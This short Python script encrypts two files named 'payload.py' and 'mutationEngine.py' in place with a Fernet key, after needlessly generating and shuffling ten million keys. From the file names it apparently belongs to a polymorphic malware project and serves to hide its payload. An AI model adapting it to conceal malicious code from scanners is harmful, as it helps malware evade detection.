def encryptionRoutine():
    from cryptography.fernet import Fernet
    import random
    # generate list of random keys
    keys = []
    for i in range(10000000):
        keys.append(Fernet.generate_key())
    # randomize keys
    random.shuffle(keys)
    # storing the key in a file for decryption
    with open('filekey.key', 'wb') as filekey:
        filekey.write(keys[0])
    # Make encryptor
    encryptor = Fernet(keys[0])
    return encryptor

def encryptFile(filename, encryptor):
    with open(filename, 'rb') as file:
        original = file.read()
     
    # encrypting the file
    encrypted = encryptor.encrypt(original)
 
    # opening the file in write mode and
    # writing the encrypted data
    with open(filename, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

encryptor = encryptionRoutine()

encryptFile("payload.py", encryptor)
encryptFile("mutationEngine.py", encryptor)
